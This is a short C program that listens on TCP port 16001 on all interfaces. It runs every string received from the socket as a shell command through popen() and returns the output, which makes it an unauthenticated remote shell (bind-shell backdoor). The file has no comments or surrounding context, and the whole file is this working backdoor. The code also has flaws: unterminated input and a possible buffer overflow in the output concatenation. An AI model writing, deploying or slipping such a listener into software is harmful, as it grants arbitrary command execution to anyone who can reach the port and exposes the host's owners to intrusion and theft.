#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <strings.h>
#include <unistd.h>
#include <netinet/in.h>  // struct sockaddr_in
#include <arpa/inet.h>
#include <string.h>

void func(int sockfd){
	int n;
	FILE* fp;
	char buff[100], output[5000], line[250], newline = '\n';
	while(1){
		bzero(buff, sizeof(buff));
		bzero(output,sizeof(output));
		n = read(sockfd, buff, sizeof(buff));
		fp = popen(buff, "r");
		while(fgets(line,sizeof(line),fp)!=NULL){
			strcat(output,line);
			bzero(line,sizeof(line));
		}
		write(sockfd, output, sizeof(output));
	}
	pclose(fp);
}

int main(){
	int sockfd, connfd, len;
	struct sockaddr_in serv, cli;
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	bzero(&serv, sizeof(serv));
	serv.sin_family = AF_INET;
	serv.sin_addr.s_addr = htonl(INADDR_ANY);
	serv.sin_port = htons(16001);
	bind(sockfd, (struct sockaddr *)&serv, sizeof(serv));
	listen(sockfd, 5);
	len = sizeof(cli);
	connfd = accept(sockfd, (struct sockaddr *)&cli, &len);
	func(connfd);
	close(sockfd);
	return 0;
}
